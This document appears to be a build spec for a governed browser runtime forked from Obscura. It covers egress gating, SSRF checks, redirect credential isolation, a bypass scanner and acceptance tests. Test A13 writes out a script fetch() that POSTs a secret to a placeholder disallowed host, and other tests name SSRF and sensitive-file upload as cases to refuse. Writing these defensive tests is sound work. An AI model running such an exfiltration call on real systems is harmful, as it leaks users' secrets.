# OMNIS GLASS v1 — Build Spec

**From:** Pan architecture · **Builder:** Tifa · **Date:** 2026-09-01
**Status:** BUILD ORDER (executable) · **Plan gate:** Pan 2026-09-01 — 5 fixes folded, then A13 pulled into v1 + 2 minors. This is the spec of record.

## Gate-independence (declare at gate start)

Builder: Tifa (Cursor). **Tifa records her composer's base model in `BUILD-RECEIPT.md`.** If it's Claude-family, Pan's artifact read is same-family — **Bulma (GPT-5.6) owns the security verdict** on the egress gate, SSRF, redaction, the MCP governed path (2b), and the CDP-bypass guard (2d).

## Goal

Fork Obscura → governed browser runtime. Three surfaces: egress gate (TERMINUS `kind: browser`), ingress provenance (`web.capture`), receipt ledger (`browser.action`).

---

## Phase 0 — Fork hygiene + dispatch audit

### 0a — Fork hygiene (done at clone)
- Clone upstream → `jourdanlabs/omnis-glass`
- `upstream` remote → `h4ckf0r0day/obscura`
- `docs/UPSTREAM-POLICY.md`
- Apache 2.0 retained; `NOTICE` attribution line

### 0b — Dispatch entry audit (required before Phase 2 commit)
Obscura has multiple browser-action paths. Verify and document in `docs/DISPATCH-AUDIT.md`:

| Entry | Path | Through CDP `dispatch.rs`? | v1 handling |
|---|---|---|---|
| CDP WebSocket server | `obscura-cdp/src/server.rs → dispatch::dispatch` | Yes | Gate at chokepoint (2a) |
| CDP recursion | `Target.sendMessageToTarget → inner dispatch` | Yes | Same chokepoint (2a) |
| MCP tools | `obscura-mcp/src/lib.rs → Page::* directly` | No | Own governed path (2b) |
| CLI `fetch` / `scrape` | `obscura-cli/src/main.rs → Page::navigate_with_wait` | No | Own governed path (2c) |
| CLI `--eval` | `Page::evaluate` direct | No | Same as 2c |
| `--dump original` | `fetch_original_bytes` (HTTP client only) | No | **HTTP-client gate (2a script-fetch)** |
| JS `fetch()` from evaluated scripts | `op_fetch_url` in `obscura-js → ObscuraHttpClient` direct | No | **HTTP-client gate (2a script-fetch) — v1, not deferred** |

**Spike conclusion (confirmed):** the CDP chokepoint alone is necessary but not sufficient. MCP is the primary agent surface and does not route through `dispatch.rs`. CLI one-shot paths and the two HTTP-client-direct paths (`op_fetch_url`, `fetch_original_bytes`) are separate egress that must each be gated.

---

## Phase 1 — OMNIS crates

| Crate | Responsibility |
|---|---|
| `glass-terminus` | `OutboundEnvelope`, lane loader, shell to `scripts/terminus-authorize.mjs` |
| `glass-capture` | `web.capture` receipts, `capture_kind` structural check, SSRF guard |
| `glass-ledger` | `browser.action` hash-chain, Ed25519 writer, `verify_chain`, redaction |

**Deliverables:**
- `browser-lanes.yaml` + policy digest
- `scripts/terminus-authorize.mjs` (browser `kind`, same stdout contract as CADUCEUS)
- Unit tests per crate

**Lane policy boot behavior (architecture §7):** invalid `browser-lanes.yaml` → refuse every governed lane, name the offending key, **do not exit**:
- `LanePolicy.valid == false` → all `authorize()` return `REFUSE_POLICY_INVALID` with `invalid_reason` naming the key/path
- Process stays up; operator sees which lane config is broken
- **A11** — corrupt a lane key → boot succeeds, every governed action REFUSE, stderr/log names the key

---

## Phase 2 — Governed boundaries

### 2a — CDP chokepoint
Single chokepoint: `obscura-cdp/src/dispatch.rs → glass::gate_cdp_command()` before domain handlers.

Governed CDP methods (v1):

| CDP method | Browser action |
|---|---|
| `Page.navigate` | navigate |
| `Input.insertText` | type |
| `Input.dispatchKeyEvent` | type (when text present) |
| `Runtime.evaluate` | eval |
| `Runtime.callFunctionOn` | eval |
| `DOM.setFileInputFiles` | upload |
| `Fetch.continueRequest` (POST body) | submit |
| `Storage.setCookies` / `Network.setCookies` | storage-write |
| `Storage.clearCookies` / `Storage.deleteCookies` | storage-write |

After ALLOW: execute handler. On ingress (scrape / content / screenshot / download): emit `web.capture` + append `browser.action`.

**Credential forwarding on redirect (architecture §3a):** when an allowed host navigates and receives a cross-origin 302:
- Re-evaluate destination through egress gate + SSRF guard before following
- `Authorization` header and session cookies **must not forward** to the post-redirect origin
- **A12** — allowed host → cross-origin 302 → redirect target reached without the prior origin's `Authorization` / cookie-jar entries attached
- (A5 covers SSRF-via-redirect; A12 is the separate credential-isolation case.)

**HTTP-client gate — `script-fetch` and `--dump original` (v1, architecture §3a):**
`op_fetch_url` (JS `fetch()` from evaluated scripts) and `fetch_original_bytes` (`--dump original`) hit `ObscuraHttpClient` directly, bypassing CDP `Fetch.*`.
- Wrap the **`ObscuraHttpClient` request boundary**: before any outbound request, run `validate_url` (SSRF/allowlist) + build a TERMINUS `OutboundEnvelope` with `action: "script-fetch"` (JS fetch) or `action: "dump-original"` (`--dump`), same egress gate as CDP.
- REFUSE / HOLD / ALLOW before the socket opens. Secret in a `fetch()` body → REFUSE. Disallowed host → REFUSE.
- One wrap covers both paths.
- **A13** — evaluated script calls `fetch('<disallowed host>', { method:'POST', body:'<secret>' })` → **REFUSE at the `ObscuraHttpClient` boundary, before the request leaves**; provider never contacted. Same test with `--dump original <disallowed host>` → REFUSE.

### 2b — MCP governed path (architecture §6 — not branding)
MCP tools call `Page::*` directly. Every MCP tool routes through the same TERMINUS + capture + ledger stack:
`MCP tool handler → glass::gate_browser_action(envelope) → ALLOW → Page op → web.capture on return`

Tool results carry `provenance`:
```json
{
  "content": [...],
  "provenance": { "url": "…", "content_sha256": "…", "captured_at": "…", "capture_kind": "live" }
}
```

**Implementation — pick one, prove in spike:**
- **Preferred:** thin MCP adapter calls `glass::gate_*` + shared capture/ledger helpers (same Rust gate logic as CDP, no duplicate deny rules).
- **Alternate:** MCP issues CDP commands through in-process `dispatch::dispatch` (proves the single chokepoint covers it).
- Either way, MCP is **not** covered by the CDP chokepoint alone.

MCP governed tools (minimum v1):

| MCP tool | Browser action |
|---|---|
| `browser_navigate` | navigate |
| `browser_fill` / `browser_type` | type |
| `browser_click` (submit) | click-submit |
| `browser_evaluate` | eval |
| `browser_set_cookie` / `browser_set_storage_state` | storage-write |
| `browser_set_cookie` / `browser_set_storage_state` | storage-write |
| `browser_snapshot` / `browser_markdown` / `browser_extract` | ingress → `web.capture` |

### 2c — CLI governed path
`fetch` / `scrape` / `--eval` bypass CDP. Wrap:
- Pre-navigate: `gate_browser_action(navigate, url)`
- Pre-eval: `gate_browser_action(eval, script)`
- Post-content: `emit_live_capture` + ledger entry
- `--dump original` (raw HTTP): covered by the `ObscuraHttpClient` gate in 2a.

### 2d — CDP bypass guard (CLAW §G shape)
`scripts/check-cdp-bypass.mjs` — **tree-wide, not "new code paths only":**
- Scan all `.rs` under `crates/` for calls to `dispatch::dispatch`, `domains::*::handle`, direct `Page::navigate*` / `Page::evaluate`, and direct `ObscuraHttpClient` request calls outside allowed paths.
- **Fail** unless the call site is:
  - inside `obscura-cdp/src/dispatch.rs` after `gate_cdp_command`, or
  - inside the `ObscuraHttpClient` request boundary after the TERMINUS wrap, or
  - listed in `scripts/cdp-dispatch-exemptions.json` (declared manifest).
- Exemption entries require: `file`, `symbol`, `reason` (e.g. `Target.attachToTarget` lifecycle, test harness).
- Same discipline as CLAW `check-spawn-exemptions` — existing bypasses cannot hide in legacy code.

---

## Phase 3 — CLI / MCP surface

- Bin: `omnis-glass` (+ `obscura` compat alias via `[[bin]]` name)
- `--version` → `OMNIS GLASS … (obscura …)`
- Subcommands: `fetch | scrape | serve | mcp` + `receipts verify|status`
- MCP server name: `omnis-glass` (stdio + HTTP)
- MCP tool schema: `provenance` field on all content-returning tools

---

## Phase 4 — Acceptance (CLEAR bar)

Positive controls before numbers: URI-corrupt → 0, secret-strip → 0, line-shift unchanged.

| # | Test | Can-fail file |
|---|---|---|
| A1 | Secret field + disallowed host → REFUSE before `Input.insertText` | `tests/acceptance/a1_secret_refuse.rs` |
| A2 | Crown-jewel upload → REFUSE | `tests/acceptance/a2_crown_jewel_refuse.rs` |
| A3 | Live scrape → `web.capture.content_sha256` matches bytes | `tests/acceptance/a3_live_capture.rs` |
| A4 | Eval-only / fixture → cannot stamp `capture_kind: live` | `tests/acceptance/a4_nonlive_refuse.rs` |
| A5 | SSRF literal + DNS-private + redirect-to-internal → REFUSE | `tests/acceptance/a5_ssrf.rs` |
| A6 | Tamper chain line → `verify_chain().ok == false` | `tests/acceptance/a6_chain_tamper.rs` |
| A7 | State-dir grep — zero sentinel secret / cookie / auth | `tests/acceptance/a7_no_cleartext.rs` |
| A8 | `browse:scrape` cannot type; sensitive lane host floor | `tests/acceptance/a8_lanes.rs` |
| A9 | Each test has a `_WEAKEN` mirror that must fail | per-test |
| A10 | All above run against the release binary | `tests/acceptance/release_binary.rs` |
| A11 | Invalid lane YAML → boot ok, all governed actions REFUSE, names key | `tests/acceptance/a11_invalid_lanes.rs` |
| A12 | Allowed host → cross-origin 302 → no cred forwarding | `tests/acceptance/a12_redirect_cred_isolation.rs` |
| **A13** | **Evaluated-script `fetch()` to disallowed host / secret body → REFUSE at `ObscuraHttpClient` before send; `--dump original` disallowed host → REFUSE** | `tests/acceptance/a13_http_client_gate.rs` |
| A14 | MCP `browser_navigate` disallowed host → REFUSE | `tests/acceptance/a14_mcp_egress.rs` |
| A15 | MCP `browser_snapshot` result carries `provenance.content_sha256` + `capture_kind` | `tests/acceptance/a15_mcp_provenance.rs` |

---

## Phase 5 — Gate packet

- `receipts/BUILD-RECEIPT.md` — seal timestamp, base-model declaration, test output, `readyForGate: true`
- **Pan** validates artifacts.
- **Bulma** security pass — egress gate, SSRF, redaction, **the MCP governed path (2b)**, **the CDP-bypass guard (2d)**, the `ObscuraHttpClient` gate (2a).

**Off-switch discipline:** `OMNIS_GLASS_ENFORCE = enforce | local_only | deny_all` — **no `off`.**

---

## Not in v1

- Obscura Cloud (managed hosting / residential proxies)
- Captcha bypass, bot-detection bypass, ToS-evasion tooling
- TERMINUS deny logic reimplemented in Rust (call the canonical gate)
- Full residency *verification* of target sites — declaration only (architecture §10)
- Paraphrase-level provenance on scraped content — whole-turn taint only (ABSOLUTE A1 edge)

*(script-fetch / `--dump original` are IN v1 as A13 — the earlier "deferred gap" is closed.)*

🐦‍⬛ + 🔑 — *every path that reaches the web is gated, named, or in v1. The chamber holds.*
— Pan, architect lane
